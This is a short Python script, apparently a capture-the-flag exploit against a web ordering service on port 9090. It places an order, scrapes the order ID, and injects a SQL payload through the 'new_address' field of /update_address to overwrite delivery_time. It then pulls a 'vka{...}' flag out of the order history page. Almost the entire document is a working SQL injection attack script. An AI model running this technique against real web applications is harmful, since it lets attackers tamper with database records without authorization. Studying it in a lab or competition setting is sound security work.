import re
import requests
import random
import random
import string
import time
import sys

def gen_rand(length=5):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def random_digits():
    return random.randint(10, 99)

sess = requests.Session()

IP = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
URL = f"http://{IP}:9090"

link1 = "/place_order"
link2 = "/update_address"
link3 = "/orders_history"

order_data = {
    'name': gen_rand(),
    'phone': gen_rand(),
    'address': gen_rand(),
    'comment': gen_rand(),
    'promo_code': gen_rand()
}

main_page = sess.get(url=URL)

order = sess.post(URL + link1, data=order_data)
if order.status_code == 200:

    orderid = re.search(r'<input[^>]*name="order_id"[^>]*value="(\d+)"[^>]*>', order.text).group(1)

    attack_data = {
    'order_id': orderid,
    'new_address': f"urlikecity', delivery_time = '{random_digits()}' -- "
    }

    new_order = sess.post(URL + link2, data=attack_data)

    time.sleep(6)

    orders_history = sess.get(URL + link3)

    flag = re.search(r'vka{[a-z0-9_]*}', orders_history.text).group()

    print(flag)